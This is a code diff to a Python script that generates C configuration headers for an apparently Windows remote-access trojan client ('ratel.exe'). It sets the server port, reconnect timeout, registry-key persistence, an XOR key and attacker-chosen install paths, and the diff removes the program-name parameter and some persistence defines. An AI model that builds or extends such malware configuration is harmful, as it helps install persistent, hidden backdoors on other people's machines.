@@ -162,9 +162,8 @@ def commonHeader():
 #define PORT 8888 //Port of server
 #define AUTO_PERSISTENCE false
 #define TIMEOUT 3000//Seconds for reconnect to server during a disconnection
-#define NAME_PROG L"ratel.exe" //Name of prog
 #define NAME_KEY_REGISTER  "win64" 
-#define XOR_KEY L"123456789" //The key to encrypt and decrypt data using the XOR algorithm
+#define XOR_KEY "123456789" //The key to encrypt and decrypt data using the XOR algorithm
 
 #define AUTO_MOVE false //if this is true then the program automatically moves to a predefined by the given attacker  
 #define PATH_ADMIN "C:\\\\Windows" //Persistence path if the client is running admin mode.
@@ -186,7 +185,7 @@ def commonHeader():
 """
     return header
 
-def customHeader(ip, auto, port, reco, name, registry, key): 
+def customHeader(ip, auto, port, reco, registry, key): 
     #In order not to have an error you need 4 \.
     #Example C:\ = C:\\\\
     header = """
@@ -200,13 +199,8 @@ def customHeader(ip, auto, port, reco, name, registry, key):
 #define PORT {} //Port of server
 #define AUTO_PERSISTENCE {}
 #define TIMEOUT {} // Seconds for reconnect to server during a disconnection
-#define NAME_PROG L"{}" //Name of prog
 #define NAME_KEY_REGISTER  "{}" 
 #define XOR_KEY "{}" //The key to encrypt and decrypt data using the XOR algorithm
-
-#define AUTO_MOVE false //if this is true then the program automatically moves to a predefined by the given attacker  
-#define PATH_ADMIN "C:\\\\Windows" //Persistence path if the client is running admin mode.
-#define PATH_NOT_ADMIN "C:\\\\Users\\\\$USER\\\\AppData\\\\Roaming" // DO NOT TOUCH
 
 
 // DO NOT TOUCH:
@@ -222,6 +216,6 @@ def customHeader(ip, auto, port, reco, name, registry, key):
 
 #endif
 
-""".format(ip, port, auto, reco, name, registry,key)
+""".format(ip, port, auto, reco, registry,key)
 
     return header
